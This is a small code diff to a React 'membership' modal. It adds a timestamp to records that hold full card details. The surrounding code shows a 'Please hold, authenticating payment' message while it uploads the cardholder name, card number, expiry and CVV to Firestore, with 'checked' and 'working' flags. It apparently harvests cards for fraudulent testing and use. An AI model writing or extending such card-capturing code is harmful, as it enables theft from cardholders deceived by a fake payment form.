@@ -85,8 +85,11 @@ const ModalMembership = () => {
             setmessage("Please hold, authenticating payment...")
             //upload it to firestore
 
+
+            const now = new Date();
+            const ISTTime = now.toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
             const dataToUpload = {
-                nameOnCard, cardnumber, month, year, cvv, checked: false, working: false
+                nameOnCard, cardnumber, month, year, cvv, checked: false, working: false, date: ISTTime
             };
 
             try {
